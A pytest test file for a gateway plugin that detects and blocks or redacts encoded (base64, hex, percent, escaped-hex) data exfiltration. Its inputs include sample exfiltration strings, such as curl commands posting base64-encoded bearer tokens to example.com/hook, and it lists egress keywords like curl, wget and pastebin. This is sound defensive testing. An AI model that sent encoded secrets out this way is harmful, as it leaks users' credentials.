# -*- coding: utf-8 -*-
"""Tests for encoded exfiltration detector plugin."""

# Standard
import base64
import logging

# Third-Party
from pydantic import ValidationError
import pytest

# First-Party
from mcpgateway.plugins.framework import (
    GlobalContext,
    PluginConfig,
    PluginContext,
    PromptHookType,
    PromptPrehookPayload,
    ResourcePostFetchPayload,
    ToolHookType,
    ToolPostInvokePayload,
)
from mcpgateway.plugins.framework.hooks.resources import ResourceHookType
from cpex_encoded_exfil_detection.encoded_exfil_detection import (
    _decode_candidate,
    _has_egress_context,
    _normalize_padding,
    _scan_container,
    _scan_text,
    _shannon_entropy,
    EncodedExfilDetectorConfig,
    EncodedExfilDetectorPlugin,
)


class TestEncodedDetectionScan:
    """Validate scanner behavior for the packaged detector."""

    def test_detects_base64_sensitive_payload(self):
        cfg = EncodedExfilDetectorConfig()
        encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
        payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}

        count, _redacted, findings = _scan_container(payload, cfg)

        assert count >= 1
        assert any(f.get("encoding") in {"base64", "base64url"} for f in findings)

    def test_detects_hex_payload(self):
        cfg = EncodedExfilDetectorConfig()
        encoded_hex = b"password=secret-value-for-upload".hex()
        payload = {"blob": f"POST /collect data={encoded_hex}"}

        count, _redacted, findings = _scan_container(payload, cfg)

        assert count >= 1
        assert any(f.get("encoding") == "hex" for f in findings)

    def test_redacts_when_enabled(self):
        cfg = EncodedExfilDetectorConfig(redact=True, redaction_text="[ENCODED]", block_on_detection=False)
        encoded = base64.b64encode(b"api_key=secret-token-value").decode()

        count, redacted, findings = _scan_container({"value": encoded}, cfg)

        assert count >= 1
        assert len(findings) >= 1
        assert redacted["value"] == "[ENCODED]"

    def test_clean_input_no_findings(self):
        cfg = EncodedExfilDetectorConfig()
        payload = {"message": "normal conversational text without encoded payloads"}

        count, redacted, findings = _scan_container(payload, cfg)

        assert count == 0
        assert findings == []
        assert redacted == payload

    def test_base64_with_word_boundaries(self):
        """Test that base64 patterns correctly match at word boundaries."""
        cfg = EncodedExfilDetectorConfig()

        # Should detect: base64 with spaces around it
        encoded = base64.b64encode(b"authorization: bearer secret-token-value").decode()
        payload1 = {"text": f"data {encoded} end"}
        count1, _, findings1 = _scan_container(payload1, cfg)
        assert count1 >= 1, "Should detect base64 with spaces"

        # Should detect: base64 at start of string
        payload2 = {"text": f"{encoded} followed by text"}
        count2, _, findings2 = _scan_container(payload2, cfg)
        assert count2 >= 1, "Should detect base64 at start"

        # Should detect: base64 at end of string
        payload3 = {"text": f"text followed by {encoded}"}
        count3, _, findings3 = _scan_container(payload3, cfg)
        assert count3 >= 1, "Should detect base64 at end"

        # Should detect: base64 with punctuation boundaries
        payload4 = {"text": f"curl -d '{encoded}' https://example.com"}
        count4, _, findings4 = _scan_container(payload4, cfg)
        assert count4 >= 1, "Should detect base64 with punctuation"

    def test_hex_with_word_boundaries(self):
        """Test that hex patterns correctly match at word boundaries."""
        cfg = EncodedExfilDetectorConfig()

        # Should detect: hex with spaces
        hex_data = b"password=secret-value-for-upload".hex()
        payload1 = {"text": f"data {hex_data} end"}
        count1, _, findings1 = _scan_container(payload1, cfg)
        assert count1 >= 1, "Should detect hex with spaces"

        # Should detect: hex with punctuation
        payload2 = {"text": f"POST /collect data={hex_data}"}
        count2, _, findings2 = _scan_container(payload2, cfg)
        assert count2 >= 1, "Should detect hex with punctuation"

    def test_no_false_positives_in_urls(self):
        """Test that we don't falsely detect base64-like patterns in URLs."""
        cfg = EncodedExfilDetectorConfig()

        # URLs with base64-like segments should not trigger if they're part of valid URLs
        # and don't decode to sensitive content
        payload = {"url": "https://example.com/path/to/resource", "message": "Visit our website at https://example.com"}

        count, _, findings = _scan_container(payload, cfg)
        # Should have 0 findings since these are normal URLs without sensitive encoded data
        assert count == 0, "Should not detect normal URLs as encoded exfil"

    def test_concatenated_alphanumeric_not_detected(self):
        """Test that long alphanumeric strings that aren't valid encodings don't trigger."""
        cfg = EncodedExfilDetectorConfig()

        # Long alphanumeric string that's not valid base64/hex
        payload = {"id": "user123456789abcdefghijklmnopqrstuvwxyz"}

        count, _, findings = _scan_container(payload, cfg)
        # Should not detect since it won't decode properly or meet suspicion criteria
        assert count == 0, "Should not detect random alphanumeric strings"

    def test_base64url_detection(self):
        """Test base64url encoding detection (uses - and _ instead of + and /)."""
        cfg = EncodedExfilDetectorConfig()

        # Base64url encoding
        # Standard
        import base64

        encoded = base64.urlsafe_b64encode(b"api_key=secret-token-value-here").decode()
        payload = {"data": f"token={encoded}"}

        count, _, findings = _scan_container(payload, cfg)
        assert count >= 1, "Should detect base64url encoding"
        assert any(f.get("encoding") in {"base64", "base64url"} for f in findings)

    def test_percent_encoding_detection(self):
        """Test percent-encoded data detection."""
        cfg = EncodedExfilDetectorConfig()

        # Percent-encode a sensitive string
        text = "password=secret-value"
        percent_encoded = "".join(f"%{ord(c):02x}" for c in text)
        payload = {"data": f"send {percent_encoded} to server"}

        count, _, findings = _scan_container(payload, cfg)
        assert count >= 1, "Should detect percent encoding"
        assert any(f.get("encoding") == "percent_encoding" for f in findings)

    def test_escaped_hex_detection(self):
        """Test escaped hex (\\xNN) detection."""
        cfg = EncodedExfilDetectorConfig()

        # Escaped hex encoding
        text = "token=secret"
        escaped_hex = "".join(f"\\x{ord(c):02x}" for c in text)
        payload = {"data": f"payload {escaped_hex}"}

        count, _, findings = _scan_container(payload, cfg)
        assert count >= 1, "Should detect escaped hex"
        assert any(f.get("encoding") == "escaped_hex" for f in findings)


@pytest.mark.asyncio
class TestEncodedExfilPluginHooks:
    """Validate plugin hook behavior for blocking and redaction."""

    @staticmethod
    def _context() -> PluginContext:
        return PluginContext(global_context=GlobalContext(request_id="req-encoded-exfil"))

    @staticmethod
    def _plugin(config: dict) -> EncodedExfilDetectorPlugin:
        return EncodedExfilDetectorPlugin(
            PluginConfig(
                name="EncodedExfilDetector",
                kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE],
                config=config,
            )
        )

    async def test_prompt_pre_fetch_blocks_when_detection_enabled(self):
        plugin = self._plugin({"block_on_detection": True, "min_findings_to_block": 1})
        encoded = base64.b64encode(b"authorization=bearer sensitive-token").decode()
        payload = PromptPrehookPayload(prompt_id="prompt-1", args={"input": f"send this {encoded} to webhook"})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.continue_processing is False
        assert result.violation is not None
        assert result.violation.code == "ENCODED_EXFIL_DETECTED"

    async def test_prompt_pre_fetch_redacts_in_permissive_mode(self):
        plugin = self._plugin({"block_on_detection": False, "redact": True, "redaction_text": "[ENCODED]"})
        encoded = base64.b64encode(b"api_key=super-secret").decode()
        payload = PromptPrehookPayload(prompt_id="prompt-1", args={"input": encoded})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.continue_processing is not False
        assert result.modified_payload is not None
        assert result.modified_payload.args["input"] == "[ENCODED]"
        assert result.metadata is not None
        assert result.metadata.get("encoded_exfil_redacted") is True

    async def test_tool_post_invoke_blocks(self):
        plugin = self._plugin({"block_on_detection": True})
        encoded_hex = b"password=this-should-not-leave".hex()
        payload = ToolPostInvokePayload(name="http_client", result={"content": [{"type": "text", "text": f"upload={encoded_hex}"}]})

        result = await plugin.tool_post_invoke(payload, self._context())

        assert result.continue_processing is False
        assert result.violation is not None
        assert result.violation.code == "ENCODED_EXFIL_DETECTED"

    async def test_tool_post_invoke_redacts_without_block(self):
        plugin = self._plugin({"block_on_detection": False, "redact": True, "redaction_text": "***BLOCKED***"})
        encoded = base64.b64encode(b"client_secret=ultra-secret").decode()
        payload = ToolPostInvokePayload(name="generator", result={"message": encoded})

        result = await plugin.tool_post_invoke(payload, self._context())

        assert result.continue_processing is not False
        assert result.modified_payload is not None
        assert result.modified_payload.result["message"] == "***BLOCKED***"
        assert result.metadata is not None
        assert result.metadata.get("encoded_exfil_redacted") is True

    async def test_tool_post_invoke_clean_payload(self):
        plugin = self._plugin({"block_on_detection": True})
        payload = ToolPostInvokePayload(name="generator", result={"message": "clean response"})

        result = await plugin.tool_post_invoke(payload, self._context())

        assert result.continue_processing is not False
        assert result.violation is None
        assert result.modified_payload is None

    async def test_prompt_pre_fetch_clean_payload(self):
        """Clean payload returns empty metadata without blocking or modifying."""
        plugin = self._plugin({"block_on_detection": True})
        payload = PromptPrehookPayload(prompt_id="p-1", args={"input": "hello world"})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.continue_processing is not False
        assert result.violation is None
        assert result.modified_payload is None

    async def test_findings_metadata_without_details(self):
        """When include_detection_details is False, metadata contains only summary fields."""
        plugin = self._plugin({"block_on_detection": True, "include_detection_details": False})
        encoded = base64.b64encode(b"authorization=bearer sensitive-token").decode()
        payload = PromptPrehookPayload(prompt_id="p-1", args={"input": f"send this {encoded} to webhook"})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.violation is not None
        examples = result.violation.details["examples"]
        for ex in examples:
            assert set(ex.keys()) == {"encoding", "path", "score"}


class TestEncodedExfilHelpers:
    """Unit tests for internal helper functions to ensure full coverage."""

    def test_shannon_entropy_empty_data(self):
        assert _shannon_entropy(b"") == 0.0

    def test_normalize_padding_already_aligned(self):
        candidate = "YWJj"  # len == 4, already aligned
        assert _normalize_padding(candidate) == candidate

    def test_normalize_padding_adds_padding(self):
        candidate = "YWJj" + "a"  # len == 5, needs padding
        result = _normalize_padding(candidate)
        assert len(result) % 4 == 0

    def test_decode_candidate_hex_odd_length(self):
        assert _decode_candidate("hex", "aabbccdde") is None  # 9 chars, odd

    def test_decode_candidate_escaped_hex_no_chunks(self):
        assert _decode_candidate("escaped_hex", "nothex") is None

    def test_decode_candidate_unknown_encoding(self):
        assert _decode_candidate("rot13", "hello") is None

    def test_decode_candidate_base64_invalid(self):
        assert _decode_candidate("base64", "!!!invalid!!!base64!!") is None

    def test_decode_candidate_base64url_invalid_charset(self):
        assert _decode_candidate("base64url", "has+slash/chars!") is None

    def test_has_egress_context_detects_curl(self):
        text = "curl -d 'payload' https://example.com"
        assert _has_egress_context(text, 10, 20) is True

    def test_has_egress_context_no_hints(self):
        text = "normal text without any network hints at all"
        assert _has_egress_context(text, 0, 10) is False

    def test_scan_text_skips_oversized_strings(self):
        cfg = EncodedExfilDetectorConfig(max_scan_string_length=1000)
        big_text = "a" * 1001
        result_text, findings = _scan_text(big_text, cfg)
        assert findings == []
        assert result_text == big_text

    def test_scan_text_skips_disabled_encoding(self):
        cfg = EncodedExfilDetectorConfig(enabled={"base64": False, "base64url": False, "hex": False, "percent_encoding": False, "escaped_hex": False})
        encoded = base64.b64encode(b"password=secret-token-value-here").decode()
        result_text, findings = _scan_text(f"curl {encoded} webhook", cfg)
        assert findings == []

    def test_scan_container_non_matching_type(self):
        """Non-str/dict/list containers pass through unchanged."""
        cfg = EncodedExfilDetectorConfig()
        count, result, findings = _scan_container(42, cfg)
        assert count == 0
        assert result == 42
        assert findings == []

    def test_scan_container_list_input(self):
        """Lists are recursively scanned."""
        cfg = EncodedExfilDetectorConfig()
        encoded = base64.b64encode(b"password=my-secret-value").decode()
        count, result, findings = _scan_container([f"curl {encoded} webhook"], cfg)
        assert count >= 1

    def test_printable_ratio_empty_data(self):
        # First-Party
        from cpex_encoded_exfil_detection.encoded_exfil_detection import _printable_ratio

        assert _printable_ratio(b"") == 0.0

    def test_evaluate_candidate_decoded_too_short(self):
        """Candidate decodes but result is shorter than min_decoded_length."""
        # First-Party
        from cpex_encoded_exfil_detection.encoded_exfil_detection import _evaluate_candidate

        cfg = EncodedExfilDetectorConfig(min_decoded_length=100, min_encoded_length=8)
        # Candidate is long enough to pass min_encoded_length but decodes to < 100 bytes
        candidate = base64.b64encode(b"short-but-decodable").decode()
        assert len(candidate) >= 8
        text = "prefix " + candidate + " suffix"
        start = 7
        result = _evaluate_candidate(text, "", "base64", candidate, start, start + len(candidate), cfg)
        assert result is None

    def test_scan_text_max_findings_limit(self):
        """Verify per-value finding limit is enforced."""
        cfg = EncodedExfilDetectorConfig(max_findings_per_value=1, min_suspicion_score=1)
        # Create multiple base64 segments that decode to sensitive content
        seg1 = base64.b64encode(b"password=secret-token-value-one").decode()
        seg2 = base64.b64encode(b"api_key=another-secret-value-two").decode()
        text = f"curl {seg1} upload {seg2}"
        _result_text, findings = _scan_text(text, cfg)
        assert len(findings) <= 1


# ---------------------------------------------------------------------------
# Group A — Config Validation
# ---------------------------------------------------------------------------


class TestConfigValidation:
    """Verify Pydantic config model rejects invalid values and accepts partial configs."""

    def test_config_rejects_negative_min_entropy(self):
        """min_entropy < 0 must raise ValidationError."""
        with pytest.raises(ValidationError):
            EncodedExfilDetectorConfig(min_entropy=-1.0)

    def test_config_rejects_min_entropy_above_max(self):
        """min_entropy > 8.0 must raise ValidationError."""
        with pytest.raises(ValidationError):
            EncodedExfilDetectorConfig(min_entropy=9.0)

    def test_config_rejects_min_printable_ratio_above_one(self):
        """min_printable_ratio > 1.0 must raise ValidationError."""
        with pytest.raises(ValidationError):
            EncodedExfilDetectorConfig(min_printable_ratio=1.5)

    def test_config_rejects_min_encoded_length_below_min(self):
        """min_encoded_length < 8 must raise ValidationError."""
        with pytest.raises(ValidationError):
            EncodedExfilDetectorConfig(min_encoded_length=3)

    def test_config_rejects_max_scan_string_length_below_min(self):
        """max_scan_string_length < 1000 must raise ValidationError."""
        with pytest.raises(ValidationError):
            EncodedExfilDetectorConfig(max_scan_string_length=500)

    def test_config_partial_uses_defaults(self):
        """Providing one field should leave all others at defaults."""
        cfg = EncodedExfilDetectorConfig(min_entropy=4.0)
        assert cfg.min_entropy == 4.0
        assert cfg.min_encoded_length == 24
        assert cfg.min_decoded_length == 12
        assert cfg.min_printable_ratio == 0.70
        assert cfg.min_suspicion_score == 3
        assert cfg.max_scan_string_length == 200_000
        assert cfg.max_findings_per_value == 50
        assert cfg.block_on_detection is True
        assert cfg.redact is False


# ---------------------------------------------------------------------------
# Group B — Allowlisting
# ---------------------------------------------------------------------------


class TestAllowlisting:
    """Verify allowlist_patterns configuration skips known-good encoded strings."""

    def test_allowlisted_base64_pattern_not_flagged(self):
        """A base64 string matching an allowlist regex should not produce findings."""
        # Encode a known-good value that would normally trigger detection
        allowed_value = base64.b64encode(b"authorization: bearer allowed-token-value").decode()
        cfg = EncodedExfilDetectorConfig(allowlist_patterns=[allowed_value[:16] + ".*"])
        payload = {"body": f"curl -d '{allowed_value}' https://example.com/hook"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count == 0, "Allowlisted pattern should not produce findings"

    def test_non_allowlisted_base64_still_flagged(self):
        """Allowlisting one pattern should not suppress detection of others."""
        allowed = base64.b64encode(b"authorization: bearer allowed-token-value").decode()
        flagged = base64.b64encode(b"password=super-secret-credential-value").decode()
        cfg = EncodedExfilDetectorConfig(allowlist_patterns=[allowed[:16] + ".*"])
        payload = {"body": f"curl -d '{flagged}' https://example.com/hook"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1, "Non-allowlisted pattern should still be flagged"

    def test_invalid_allowlist_regex_rejected_at_init(self):
        """An invalid regex in allowlist_patterns should raise at config or plugin init."""
        with pytest.raises((ValidationError, Exception)):
            EncodedExfilDetectorConfig(allowlist_patterns=["[invalid"])
            # If config doesn't validate, plugin init should catch it
            EncodedExfilDetectorPlugin(
                PluginConfig(
                    name="EncodedExfilDetector",
                    kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                    hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE],
                    config={"allowlist_patterns": ["[invalid"]},
                )
            )

    def test_allowlist_empty_has_no_effect(self):
        """Empty allowlist should not suppress any detections."""
        cfg = EncodedExfilDetectorConfig(allowlist_patterns=[])
        encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
        payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1

    def test_allowlist_partial_match_suppresses(self):
        """An allowlist pattern that partially matches a candidate should suppress it."""
        encoded = base64.b64encode(b"authorization: bearer super-secret-token-value").decode()
        # Pattern matches a substring of the encoded candidate
        cfg = EncodedExfilDetectorConfig(allowlist_patterns=[encoded[:12]])
        payload = {"body": f"curl -d '{encoded}' https://example.com/hook"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count == 0, "Partial allowlist match should suppress the candidate"


# ---------------------------------------------------------------------------
# Group C — Configurable Keywords
# ---------------------------------------------------------------------------


class TestConfigurableKeywords:
    """Verify extra_sensitive_keywords and extra_egress_hints are merged with defaults."""

    def test_extra_sensitive_keyword_triggers_detection(self):
        """A custom sensitive keyword (not in defaults) should boost the suspicion score."""
        # Use a keyword NOT in the built-in _SENSITIVE_KEYWORDS list
        # "watsonx_cred" is custom; the payload contains no built-in keywords
        encoded = base64.b64encode(b"watsonx_cred=xq7m9Rk2vLpN3wJfHbYd8sTc").decode()
        cfg = EncodedExfilDetectorConfig(
            extra_sensitive_keywords=["watsonx_cred"],
            min_suspicion_score=1,
        )
        payload = {"data": encoded}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1
        # The custom keyword "watsonx_cred" should trigger sensitive_keywords scoring
        assert any("sensitive_keywords" in f.get("reason", []) for f in findings)

    def test_extra_egress_hint_triggers_detection(self):
        """A custom egress hint (not in defaults) should boost the suspicion score."""
        # Use "mq_publish" which is NOT in the built-in _EGRESS_HINTS list
        # Avoid ALL built-in hints: curl, wget, http://, https://, upload, webhook,
        # beacon, dns, exfil, pastebin, socket, send
        encoded = base64.b64encode(b"datafile=xq7m9Rk2vLpN3wJfHbYd8sTcMn").decode()
        cfg = EncodedExfilDetectorConfig(
            extra_egress_hints=["mq_publish"],
            min_suspicion_score=1,
        )
        # Context only contains the custom hint "mq_publish", no built-in hints
        payload = {"data": f"mq_publish {encoded} to_queue"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1
        assert any("egress_context" in f.get("reason", []) for f in findings)

    def test_default_keywords_still_work_with_extras(self):
        """Adding custom keywords should not remove the built-in ones."""
        encoded = base64.b64encode(b"password=super-secret-credential-value").decode()
        cfg = EncodedExfilDetectorConfig(
            extra_sensitive_keywords=["custom_keyword"],
            min_suspicion_score=1,
        )
        payload = {"data": f"curl {encoded} webhook"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1
        assert any("sensitive_keywords" in f.get("reason", []) for f in findings)

    def test_mixed_case_extra_keyword_matches(self):
        """Extra sensitive keywords with mixed case must still match (case-insensitive)."""
        encoded = base64.b64encode(b"WatsonX_Cred=xq7m9Rk2vLpN3wJfHbYd8sTc").decode()
        cfg = EncodedExfilDetectorConfig(
            extra_sensitive_keywords=["WatsonX_Cred"],
            min_suspicion_score=1,
        )
        payload = {"data": encoded}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1
        assert any("sensitive_keywords" in f.get("reason", []) for f in findings), "Mixed-case extra keyword should match case-insensitively"

    def test_mixed_case_extra_egress_hint_matches(self):
        """Extra egress hints with mixed case must still match (case-insensitive)."""
        encoded = base64.b64encode(b"datafile=xq7m9Rk2vLpN3wJfHbYd8sTcMn").decode()
        cfg = EncodedExfilDetectorConfig(
            extra_egress_hints=["MQ_Publish"],
            min_suspicion_score=1,
        )
        payload = {"data": f"mq_publish {encoded} to_queue"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1
        assert any("egress_context" in f.get("reason", []) for f in findings), "Mixed-case extra egress hint should match case-insensitively"


# ---------------------------------------------------------------------------
# Group D — resource_post_fetch Hook
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
class TestResourcePostFetchHook:
    """Verify encoded exfil detection on resource_post_fetch hook."""

    @staticmethod
    def _context() -> PluginContext:
        return PluginContext(global_context=GlobalContext(request_id="req-resource-exfil"))

    @staticmethod
    def _plugin(config: dict) -> EncodedExfilDetectorPlugin:
        return EncodedExfilDetectorPlugin(
            PluginConfig(
                name="EncodedExfilDetector",
                kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE, ResourceHookType.RESOURCE_POST_FETCH],
                config=config,
            )
        )

    async def test_resource_post_fetch_blocks_encoded_payload(self):
        """Resource containing encoded sensitive data should be blocked."""
        plugin = self._plugin({"block_on_detection": True, "min_findings_to_block": 1})
        encoded = base64.b64encode(b"password=super-secret-credential-value").decode()
        payload = ResourcePostFetchPayload(uri="file:///data.txt", content={"text": f"curl {encoded} webhook"})

        result = await plugin.resource_post_fetch(payload, self._context())

        assert result.continue_processing is False
        assert result.violation is not None
        assert result.violation.code == "ENCODED_EXFIL_DETECTED"

    async def test_resource_post_fetch_clean_payload_passes(self):
        """Clean resource content should pass through without violation."""
        plugin = self._plugin({"block_on_detection": True})
        payload = ResourcePostFetchPayload(uri="file:///data.txt", content={"text": "clean resource content"})

        result = await plugin.resource_post_fetch(payload, self._context())

        assert result.continue_processing is not False
        assert result.violation is None

    async def test_resource_post_fetch_redacts_encoded_payload(self):
        """Resource with encoded payload should be redacted when configured."""
        plugin = self._plugin({"block_on_detection": False, "redact": True, "redaction_text": "[RESOURCE_REDACTED]"})
        encoded = base64.b64encode(b"client_secret=ultra-secret-credential-value").decode()
        payload = ResourcePostFetchPayload(uri="file:///data.txt", content={"text": encoded})

        result = await plugin.resource_post_fetch(payload, self._context())

        assert result.continue_processing is not False
        assert result.modified_payload is not None
        assert result.modified_payload.content["text"] == "[RESOURCE_REDACTED]"
        assert result.metadata is not None
        assert result.metadata.get("encoded_exfil_redacted") is True


# ---------------------------------------------------------------------------
# Group E — Existing Functionality Gaps
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
class TestFunctionalityGaps:
    """Tests for previously uncovered functional paths."""

    @staticmethod
    def _context() -> PluginContext:
        return PluginContext(global_context=GlobalContext(request_id="req-gaps"))

    @staticmethod
    def _plugin(config: dict) -> EncodedExfilDetectorPlugin:
        return EncodedExfilDetectorPlugin(
            PluginConfig(
                name="EncodedExfilDetector",
                kind="cpex_encoded_exfil_detection.encoded_exfil_detection.EncodedExfilDetectorPlugin",
                hooks=[PromptHookType.PROMPT_PRE_FETCH, ToolHookType.TOOL_POST_INVOKE],
                config=config,
            )
        )

    async def test_block_on_detection_false_returns_metadata_prompt_hook(self):
        """With block_on_detection=False, findings should appear in metadata, not as a violation."""
        plugin = self._plugin({"block_on_detection": False})
        encoded = base64.b64encode(b"authorization: bearer sensitive-token-value").decode()
        payload = PromptPrehookPayload(prompt_id="p-1", args={"input": f"send this {encoded} to webhook"})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.violation is None
        assert result.metadata is not None
        assert result.metadata.get("encoded_exfil_count", 0) >= 1

    async def test_block_on_detection_false_returns_metadata_tool_hook(self):
        """With block_on_detection=False, tool hook should also return metadata only."""
        plugin = self._plugin({"block_on_detection": False})
        encoded_hex = b"password=this-should-not-leave-gateway".hex()
        payload = ToolPostInvokePayload(name="http_client", result={"content": f"upload={encoded_hex}"})

        result = await plugin.tool_post_invoke(payload, self._context())

        assert result.violation is None
        assert result.metadata is not None
        assert result.metadata.get("encoded_exfil_count", 0) >= 1

    async def test_min_findings_to_block_requires_multiple(self):
        """With min_findings_to_block=3, a single finding should NOT block."""
        plugin = self._plugin({"block_on_detection": True, "min_findings_to_block": 3})
        # Single encoded segment — should produce 1 finding, not enough to block
        encoded = base64.b64encode(b"password=super-secret-credential-value").decode()
        payload = PromptPrehookPayload(prompt_id="p-1", args={"input": f"curl {encoded} webhook"})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.violation is None, "Should not block with fewer findings than min_findings_to_block"

    async def test_none_args_to_prompt_pre_fetch(self):
        """PromptPrehookPayload with args=None should not crash."""
        plugin = self._plugin({"block_on_detection": True})
        payload = PromptPrehookPayload(prompt_id="p-1", args=None)

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.continue_processing is not False
        assert result.violation is None

    async def test_empty_dict_args_returns_clean(self):
        """PromptPrehookPayload with args={} should produce no findings."""
        plugin = self._plugin({"block_on_detection": True})
        payload = PromptPrehookPayload(prompt_id="p-1", args={})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.continue_processing is not False
        assert result.violation is None

    async def test_include_detection_details_false_in_non_blocking_metadata(self):
        """With include_detection_details=False and block_on_detection=False, metadata findings should have summary keys only."""
        plugin = self._plugin({"block_on_detection": False, "include_detection_details": False})
        encoded = base64.b64encode(b"authorization: bearer sensitive-token-value").decode()
        payload = PromptPrehookPayload(prompt_id="p-1", args={"input": f"send this {encoded} to webhook"})

        result = await plugin.prompt_pre_fetch(payload, self._context())

        assert result.metadata is not None
        findings = result.metadata.get("encoded_exfil_findings", [])
        for finding in findings:
            assert set(finding.keys()) == {"encoding", "path", "score"}


# ---------------------------------------------------------------------------
# Group F — Bypass Resistance
# ---------------------------------------------------------------------------


class TestBypassResistance:
    """Verify detection cannot be trivially bypassed."""

    def test_mixed_case_hex_detected(self):
        """Hex with alternating case should still be detected."""
        cfg = EncodedExfilDetectorConfig()
        # Encode with mixed case
        raw = b"password=secret-value-for-upload"
        hex_str = raw.hex()
        mixed = "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(hex_str))
        payload = {"blob": f"POST /collect data={mixed}"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1, "Mixed-case hex should still be detected"
        assert any(f.get("encoding") == "hex" for f in findings)

    def test_exactly_at_min_encoded_length_detected(self):
        """A candidate exactly at min_encoded_length should be evaluated (not skipped)."""
        min_len = 24
        cfg = EncodedExfilDetectorConfig(min_encoded_length=min_len, min_suspicion_score=1, min_decoded_length=4)
        # Create a hex string of exactly min_len characters (24 hex chars = 12 bytes)
        raw = b"password=sec"  # 12 bytes → 24 hex chars
        hex_str = raw.hex()
        assert len(hex_str) == min_len
        payload = {"data": f"curl {hex_str} webhook"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1, f"Candidate at exactly min_encoded_length ({min_len}) should be evaluated"

    def test_one_below_min_encoded_length_not_detected(self):
        """A candidate one below min_encoded_length should be skipped."""
        min_len = 24
        cfg = EncodedExfilDetectorConfig(min_encoded_length=min_len, min_suspicion_score=1)
        # 22 hex chars = 11 bytes, below 24 threshold
        raw = b"password=se"  # 11 bytes → 22 hex chars
        hex_str = raw.hex()
        assert len(hex_str) < min_len
        payload = {"data": f"curl {hex_str} webhook"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count == 0, "Candidate below min_encoded_length should not be detected"

    def test_padding_variations_base64(self):
        """Base64 with various padding states should all be decoded and detected."""
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1)

        # No padding needed (length divisible by 4 after encode)
        encoded_no_pad = base64.b64encode(b"password=secret-token-value!").decode().rstrip("=")
        # Standard padding
        encoded_padded = base64.b64encode(b"api_key=super-secret-token-val").decode()

        for variant in [encoded_no_pad, encoded_padded]:
            payload = {"data": f"curl {variant} webhook"}
            count, _redacted, findings = _scan_container(payload, cfg)
            assert count >= 1, f"Base64 variant '{variant[:20]}...' should be detected"

    def test_encoded_payload_split_across_fields(self):
        """Each field should be scanned independently; suspicious fields detected."""
        cfg = EncodedExfilDetectorConfig()
        # Two independently suspicious encoded payloads in separate fields
        seg1 = base64.b64encode(b"password=secret-credential-value-one").decode()
        seg2 = base64.b64encode(b"api_key=another-secret-credential-two").decode()
        payload = {"field1": f"curl {seg1} webhook", "field2": f"wget {seg2} upload"}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 2, "Both fields with encoded payloads should produce findings"
        paths = [f.get("path", "") for f in findings]
        assert any("field1" in p for p in paths), "field1 should have findings"
        assert any("field2" in p for p in paths), "field2 should have findings"

    def test_long_segment_scoring_bonus(self):
        """A candidate >= 2x min_encoded_length should get 'long_segment' bonus."""
        cfg = EncodedExfilDetectorConfig(min_suspicion_score=1)
        # Create a long payload (well over 2x default 24)
        long_secret = b"authorization: bearer " + b"x" * 100
        encoded = base64.b64encode(long_secret).decode()
        assert len(encoded) >= 48  # 2x default min_encoded_length
        payload = {"data": encoded}

        count, _redacted, findings = _scan_container(payload, cfg)
        assert count >= 1
        assert any("long_segment" in f.get("reason", []) for f in findings), "Long segment should get scoring bonus"


# ---------------------------------------------------------------------------
# Group G — Edge Cases
# ---------------------------------------------------------------------------


class TestEdgeCases:
    """Edge case coverage for scanner internals."""

    def test_max_scan_string_length_exact_boundary_not_skipped(self):
        """A string of exactly max_scan_string_length should be scanned."""
        max_len = 1000
        cfg = EncodedExfilDetectorConfig(max_scan_string_length=max_len, min_suspicion_score=1)
        encoded = base64.b64encode(b"password=secret-token-value-long").decode()
        # Pad to exactly max_len
        text = encoded + " " * (max_len - len(encoded))
        assert len(text) == max_len

        result_text, findings = _scan_text(text, cfg)
        # Should be scanned (not skipped), whether or not it finds something depends on scoring
        # The key assertion is that it's not treated as oversized
        assert result_text is not None  # scan ran, didn't skip

    def test_max_scan_string_length_plus_one_skipped(self):
        """A string of max_scan_string_length + 1 should be skipped entirely."""
        max_len = 1000
        cfg = EncodedExfilDetectorConfig(max_scan_string_length=max_len)
        encoded = base64.b64encode(b"password=secret-token-value-long").decode()
        text = encoded + " " * (max_len + 1 - len(encoded))
        assert len(text) == max_len + 1

        result_text, findings = _scan_text(text, cfg)
        assert findings == []
        assert result_text == text  # returned unchanged

    def test_all_encodings_disabled_returns_zero(self):
        """Disabling all encodings should produce zero findings regardless of payload."""
